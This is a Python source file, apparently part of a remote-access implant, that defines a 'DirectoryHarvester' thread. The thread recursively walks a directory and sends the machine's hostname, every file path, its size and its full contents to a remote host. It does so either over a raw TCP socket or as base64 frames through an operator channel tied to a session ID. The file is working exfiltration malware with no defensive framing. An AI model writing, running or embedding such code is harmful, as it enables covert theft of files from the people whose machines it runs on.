import os
from threading import Thread
import socket
import base64

class DirectoryHarvester(Thread):

	def __init__(self, dirname, daemon, target_host, target_port, session_id, integrated_comms):
		Thread.__init__(self)
		self.dirname = dirname
		self.stayAlive = True
		self.isHarvestComplete = False;
		self.daemon = daemon
		self.target_host = target_host
		self.target_port = target_port
		self.session_id = session_id
		self.integrated_comms = integrated_comms

	def run(self):
		self.walkDir(self.dirname)

	def kill(self):
		self.stayAlive = False

	def isComplete(self):
		return self.isHarvestComplete

	def walkDir(self, dirname):
		if not self.integrated_comms:
			#TODO: Add recovery
			remoteSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			remoteSocket.connect((self.target_host, self.target_port))
			hostname = socket.gethostname()
			hostnameLen = len(hostname)
			#print("Hostname: " + hostname + " " + str(hostnameLen))
			hostnameLenBytes = hostnameLen.to_bytes(4, 'big')
			remoteSocket.send(hostnameLenBytes)
			remoteSocket.send(hostname.encode('ascii'))
		for root, dirs, files in os.walk(dirname):
			for file in files:
				if self.stayAlive:
					absFilename = os.path.abspath(root + "//" + file)
					#print("Processing file: " + absFilename)
					absFilenameLen = len(absFilename)
					absFilenameBytes = absFilenameLen.to_bytes(4, 'big')
					fileSize = os.path.getsize(absFilename)
					fileSizeBytes = fileSize.to_bytes(8, 'big')
					frame = bytearray()
					first_xmission = True
					if self.integrated_comms:
						frame.extend(absFilenameBytes)
						frame.extend(absFilename.encode('ascii'))
						frame.extend(fileSizeBytes)
					else:
						remoteSocket.send(absFilenameBytes)
						remoteSocket.send(absFilename.encode('ascii'))
						remoteSocket.send(fileSizeBytes)
					with open(absFilename, 'rb') as f:
						while True and self.stayAlive:
							buf = f.read(100000)
							if buf: 
								if self.integrated_comms:
									if not first_xmission:
										frame = bytearray()                                    
									else:
										first_xmission = False
									frame.extend(buf)
									self.daemon.postDirHarvest(base64.b64encode(frame).decode('ascii'), self.session_id)
								else:
									remoteSocket.send(buf)
							else:
								break
		endMsg = "End of transmission"
		endMsgLen = len(endMsg)
		endMsgLenBytes = endMsgLen.to_bytes(4, 'big')
		if self.integrated_comms:
			frame = bytearray()                                
			frame.extend(endMsgLenBytes)
			frame.extend(endMsg.encode('ascii'))
			self.daemon.postDirHarvest(base64.b64encode(frame).decode('ascii'), self.session_id)
		else:
			remoteSocket.send(endMsgLenBytes)
			remoteSocket.send(endMsg.encode('ascii'))
		self.isHarvestComplete = True
		if self.stayAlive:
			self.daemon.postResponse("Harvest complete: " + dirname)